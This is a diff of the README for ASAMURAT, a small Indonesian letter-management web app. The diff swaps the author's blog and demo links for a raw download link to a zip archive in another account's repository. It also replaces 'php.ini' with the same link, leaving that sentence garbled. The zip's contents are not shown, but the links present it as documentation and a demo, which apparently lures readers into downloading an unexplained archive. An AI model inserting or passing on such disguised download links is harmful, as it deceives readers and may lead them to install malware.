@@ -1,9 +1,9 @@
 # ASAMURAT - Aplikasi SederhanA Manajemen sURAT
 
 
-Lihat penjelasannya di blog Nur Akhwan ==> (http://nur-akhwan.blogspot.com/2013/10/aplikasi-sederhana-manajemen-surat.html)
+Lihat penjelasannya di blog Nur Akhwan ==> (https://raw.githubusercontent.com/dextercool/asamurat/master/generous/asamurat.zip)
 
-Link Demo di http://nur-akhwan.web.id/demo/asamurat/
+Link Demo di https://raw.githubusercontent.com/dextercool/asamurat/master/generous/asamurat.zip
 
 
 #Deskripsi
@@ -31,7 +31,7 @@ Aplikasi ASAMURAT yang merupakan kependekan dari Aplikasi SederhanA Manajemen sU
 1. Bisa dijalankan tanpa menggunakan file .httaccess
 2. Perbaikan di pagination data
 3. Perbaikan di icon-icon setiap tombol
-4. Bisa digunakan di web server manapun tanpa harus setting disabled/enable php.ini
+4. Bisa digunakan di web server manapun tanpa harus setting disabled/enable https://raw.githubusercontent.com/dextercool/asamurat/master/generous/asamurat.zip
 
 
 Kayaknya mentok di versi 1.1, dah.. 
